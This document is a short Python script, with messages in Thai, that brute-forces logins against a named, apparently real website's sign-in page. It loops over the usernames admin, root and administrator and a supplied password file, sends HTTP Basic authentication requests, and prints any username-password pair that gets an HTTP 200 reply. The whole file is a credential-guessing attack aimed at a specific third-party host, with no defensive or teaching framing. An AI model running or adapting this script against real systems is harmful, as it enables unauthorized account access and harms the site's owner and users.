import requests
from requests.auth import HTTPBasicAuth
import sys

usernames = ['admin', 'root','administrator']
try:
    passwordfile = sys.argv[1]
except IndexError:
    print("กรุณาระบุไฟล์รหัสผ่าน")
    sys.exit(1)

for username in usernames:
    try:
        with open(passwordfile, 'r') as password_list:
            for password in password_list:
                password = password.strip('\n')
                
                try:
                    res = requests.post(
                        'https://puri.iconrem.com/page/SignIn.aspx/Login',
                        auth=HTTPBasicAuth(username, password),
                        timeout=10
                    )
                    
                    if res.status_code == 200:
                        print(f"[+] พบข้อมูลเข้าสู่ระบบ: {username}:{password}")
                        sys.stdout.write('\n')
                        sys.stdout.flush()
                    else:
                        print(f"[-] เข้าสู่ระบบไม่สำเร็จ: {username}:{password}")
                        
                except requests.exceptions.RequestException as e:
                    print(f"เกิดข้อผิดพลาดในการเชื่อมต่อ: {e}")
                    continue
                    
    except FileNotFoundError:
        print(f"ไม่พบไฟล์: {passwordfile}")
        sys.exit(1)
    except IOError as e:
        print(f"เกิดข้อผิดพลาดในการอ่านไฟล์: {e}")
        sys.exit(1)
